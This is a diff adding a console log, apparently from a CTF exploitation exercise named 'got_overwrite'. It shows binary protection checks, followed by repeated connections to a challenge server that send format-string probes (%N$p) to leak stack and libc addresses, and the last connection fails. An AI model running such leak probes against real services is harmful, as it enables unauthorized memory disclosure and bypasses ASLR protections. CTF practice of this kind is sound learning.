@@ -1,0 +1,359 @@
+[*] '/home/dadan/pwn/sijawara/got_overwrite/libc.so.6'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    FORTIFY:    Enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+0: %0$p
+0: Skipping invalid value
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+1: 0x7f8759563963
+Leaked value - 0x2045c0 = 0x7f875935f3a3
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+2: 0xfbad208b
+Leaked value - 0x2045c0 = 0xfb8cdacb
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+3: 0x7ffca4a5dec0
+Leaked value - 0x2045c0 = 0x7ffca4859900
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+4: 0x1
+Leaked value - 0x2045c0 = -0x2045bf
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+5: (nil)
+5: Skipping invalid value
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+6: 0xa70243625
+Leaked value - 0x2045c0 = 0xa7003f065
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+7: 0x7fe9bca0edca
+Leaked value - 0x2045c0 = 0x7fe9bc80a80a
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+8: (nil)
+8: Skipping invalid value
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+9: (nil)
+9: Skipping invalid value
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+10: 0x1
+Leaked value - 0x2045c0 = -0x2045bf
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+11: 0x7ffcf27d3da8
+Leaked value - 0x2045c0 = 0x7ffcf25cf7e8
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+12: 0x1
+Leaked value - 0x2045c0 = -0x2045bf
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+13: (nil)
+13: Skipping invalid value
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+14: 0x5620cd756dd8
+Leaked value - 0x2045c0 = 0x5620cd552818
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+15: 0x2be1c55648f75c00
+Leaked value - 0x2045c0 = 0x2be1c55648d71640
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+16: 0x7ffe81f88010
+Leaked value - 0x2045c0 = 0x7ffe81d83a50
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+17: 0x564ad050c2b3
+Leaked value - 0x2045c0 = 0x564ad0307cf3
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+18: 0x7ffc386589d0
+Leaked value - 0x2045c0 = 0x7ffc38454410
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+19: 0x7fde26e751ca
+Leaked value - 0x2045c0 = 0x7fde26c70c0a
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+20: 0x7ffcbbd349e0
+Leaked value - 0x2045c0 = 0x7ffcbbb30420
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+21: 0x7ffdebe3e038
+Leaked value - 0x2045c0 = 0x7ffdebc39a78
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+22: 0x19b423040
+Leaked value - 0x2045c0 = 0x19b21ea80
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+23: 0x557f69302288
+Leaked value - 0x2045c0 = 0x557f690fdcc8
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+24: 0x7ffc38f3eb98
+Leaked value - 0x2045c0 = 0x7ffc38d3a5d8
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+25: 0x558a5f99761a2a59
+Leaked value - 0x2045c0 = 0x558a5f9975f9e499
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+26: 0x1
+Leaked value - 0x2045c0 = -0x2045bf
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+27: (nil)
+27: Skipping invalid value
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+28: 0x55ea1cb84dd8
+Leaked value - 0x2045c0 = 0x55ea1c980818
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+29: 0x7ff0fd0a9000
+Leaked value - 0x2045c0 = 0x7ff0fcea4a40
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+30: 0x1ae50dab3eb7a008
+Leaked value - 0x2045c0 = 0x1ae50dab3e975a48
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+31: 0x7409e3c641902054
+Leaked value - 0x2045c0 = 0x7409e3c6416fda94
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+32: 0x7ffe00000000
+Leaked value - 0x2045c0 = 0x7ffdffdfba40
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+33: (nil)
+33: Skipping invalid value
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+34: (nil)
+34: Skipping invalid value
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+35: 0x1
+Leaked value - 0x2045c0 = -0x2045bf
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+36: 0x7ffd245080c0
+Leaked value - 0x2045c0 = 0x7ffd24303b00
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+37: 0x34277e376d24cd00
+Leaked value - 0x2045c0 = 0x34277e376d048740
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+38: 0x7ffe4c488a00
+Leaked value - 0x2045c0 = 0x7ffe4c284440
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+39: 0x7fd65ce4a28b
+Leaked value - 0x2045c0 = 0x7fd65cc45ccb
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+40: 0x7ffcad3c6528
+Leaked value - 0x2045c0 = 0x7ffcad1c1f68
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+41: 0x56142ddfadd8
+Leaked value - 0x2045c0 = 0x56142dbf6818
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+42: 0x7ffdec60c718
+Leaked value - 0x2045c0 = 0x7ffdec408158
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+43: 0x55d0931a2288
+Leaked value - 0x2045c0 = 0x55d092f9dcc8
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+44: (nil)
+44: Skipping invalid value
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+45: (nil)
+45: Skipping invalid value
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+46: 0x5614f9e0f0e0
+Leaked value - 0x2045c0 = 0x5614f9c0ab20
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+47: 0x7ffda5151b40
+Leaked value - 0x2045c0 = 0x7ffda4f4d580
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+48: (nil)
+48: Skipping invalid value
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+49: (nil)
+49: Skipping invalid value
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+50: (nil)
+50: Skipping invalid value
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+51: 0x55c18709d105
+Leaked value - 0x2045c0 = 0x55c186e98b45
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+52: 0x7ffd92dfbc38
+Leaked value - 0x2045c0 = 0x7ffd92bf7678
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+53: 0x38
+Leaked value - 0x2045c0 = -0x204588
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+54: 0x1
+Leaked value - 0x2045c0 = -0x2045bf
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+55: 0x7ffc97ab6eee
+Leaked value - 0x2045c0 = 0x7ffc978b292e
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+56: (nil)
+56: Skipping invalid value
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213: Trying 116.254.117.234
+[+] Opening connection to ctf-chall.stembascc.com on port 5213: Done
+57: 0x7ffe7034eef6
+Leaked value - 0x2045c0 = 0x7ffe7014a936
+[*] Closed connection to ctf-chall.stembascc.com port 5213
+[x] Opening connection to ctf-chall.stembascc.com on port 5213
+[-] Opening connection to ctf-chall.stembascc.com on port 5213: Failed
